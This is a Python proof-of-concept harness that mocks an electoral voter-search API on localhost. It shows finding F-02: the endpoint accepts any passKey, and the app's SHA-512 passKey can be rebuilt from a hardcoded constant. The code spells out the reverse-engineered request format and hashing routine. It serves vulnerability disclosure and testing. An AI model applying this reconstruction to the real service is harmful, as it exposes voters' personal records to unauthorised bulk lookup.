"""
Offline harness for the ECINET electoral-search flow (F-02).

Runs the reconstructed contract entirely on localhost:
  GET /api/search?epic_no=..&search_type=epic&passKey=..&page_no=..
  -> ElectroleSearchUpdate-shaped JSON

Demonstrates the vulnerability without contacting ECI production:
the server accepts ANY passKey, because the client-side value carries
no per-user or per-session identity (see DigitalEpicActivity.callSearchApi
and Utils.GetHashNew).
"""

import hashlib
import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

APP_CONST = "IPS2062445"          # hardcoded in DigitalEpicActivity.callSearchApi
RECORD = {
    "response": {
        "status": 200,
        "message": "Success",
        "epicNo": None,
        "electorName": None,
        "fatherName": None,
        "motherName": None,
        "gender": None,
        "dateOfBirth": None,
        "address": None,
        "partNo": None,
        "serialNo": None,
        "sectionNo": None,
        "pollingStationName": None,
        "pollingStationAddress": None,
        "voterStatus": None,
        "photoAvailable": False,
    }
}


def get_hash_new(input_str: str, secure_key: str) -> str:
    """Faithful port of com/eci/citizen/utility/Utils.GetHashNew.

    digest = SHA-512( trim(input) + trim(secureKey) ), UTF-8, lowercase hex.
    No HMAC, no salt derivation, no iteration.
    Note: the app also writes this value to System.out (debug-log leak).
    """
    try:
        digest = hashlib.sha512((input_str.strip() + secure_key.strip()).encode("utf-8")).digest()
    except Exception:
        return ""
    return "".join(format(b, "02x") for b in digest)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("   [server] " + fmt % args)

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path.rstrip("/") != "/api/search":
            self.send_response(404)
            self.end_headers()
            return

        q = parse_qs(parsed.query)
        epic = (q.get("epic_no") or [""])[0]
        stype = (q.get("search_type") or [""])[0]
        passkey = (q.get("passKey") or [""])[0]
        page = (q.get("page_no") or ["1"])[0]

        print("\n   [server] received reconstructed request")
        print(f"     epic_no     = {epic}")
        print(f"     search_type = {stype}")
        print(f"     passKey     = {passkey[:32]}... ({len(passkey)} hex chars)")
        print(f"     page_no     = {page}")

        # THE VULNERABILITY: no verification against any credential store.
        # Any non-empty passKey is accepted, by anyone, forever.
        if not passkey:
            print("     -> rejected (empty passKey)")
            self.send_response(401)
            self.end_headers()
            return

        print("     -> ACCEPTED without credential verification (F-02)")

        body = json.loads(json.dumps(RECORD))
        r = body["response"]
        r.update({
            "epicNo": epic,
            "electorName": "MOCK SAMPLE - NOT REAL DATA",
            "gender": "M",
            "voterStatus": "Y",
            "photoAvailable": False,
            "page_no": page,
        })

        payload = json.dumps(body).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


def main():
    print("=" * 70)
    print("ECINET electoral-search harness -- LOCALHOST ONLY")
    print("=" * 70)

    srv = HTTPServer(("127.0.0.1", 8765), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    # Reconstruct exactly what the app sends. The secure key would come from
    # the native .so; any value works, which is the point of F-02/F-03.
    demo_secure_key = "DEMO-NATIVE-KEY-NOT-EXTRACTED"
    passkey = get_hash_new(APP_CONST, demo_secure_key)

    print(f"\n  app constant     : {APP_CONST}")
    print(f"  secure key       : {demo_secure_key}")
    print(f"  passKey (SHA-512): {passkey}")

    epic = "SQX2097129"
    from urllib.request import urlopen
    url = (f"http://127.0.0.1:8765/api/search?epic_no={epic}"
           f"&search_type=epic&passKey={passkey}&page_no=1")

    print(f"\n  GET {url[:88]}...")
    with urlopen(url) as r:
        print(f"\n  HTTP {r.status}")
        print(json.dumps(json.loads(r.read()), indent=2)[:700])

    # Show the flaw explicitly: a bogus key is equally accepted.
    print("\n  [control] same request with a garbage passKey:")
    bad = "http://127.0.0.1:8765/api/search?epic_no=X&search_type=epic&passKey=deadbeef&page_no=1"
    with urlopen(bad) as r:
        print(f"  HTTP {r.status}  <- accepted, same as a valid key (no auth)")

    srv.shutdown()
    print("\n  Server stopped. No production traffic was generated.")


if __name__ == "__main__":
    main()